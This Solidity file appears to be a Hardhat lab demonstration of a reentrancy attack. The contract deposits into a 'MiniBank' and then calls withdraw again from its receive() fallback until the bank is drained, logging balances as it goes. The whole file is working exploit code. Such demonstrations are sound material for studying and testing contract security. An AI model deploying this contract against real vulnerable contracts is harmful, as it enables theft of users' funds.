// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IMiniBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentranceAttack {
    IMiniBank public bank;
    address public owner;   

    constructor(address _bank) {
        bank = IMiniBank(_bank);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value > 1, "Need 1 ETH to attack"); 
        console.log("Attack started. Contract balance:", address(this).balance);
        console.log("Bank balance:", address(bank).balance);
        bank.deposit{value: msg.value}();
        console.log("After deposit. Contract balance:", address(this).balance);
        console.log("Bank balance:", address(bank).balance);
        bank.withdraw(1 ether);
        console.log("After withdraw. Bank balance:", address(bank).balance);
    }

    receive() external payable {
        uint256 balance = address(bank).balance;
        console.log("Receive called! Bank balance:", balance);
        console.log("Contract balance:", address(this).balance);

        if (balance > 0) {
            console.log("Withdrawing 1 ether:", balance);
            bank.withdraw(1 ether);
        }
        else{
            // TODO: Stop here, we dont want the money back to Bank
            console.log("!!!!! We drained the bank: ", balance, " !!!!!");
        }
    }
}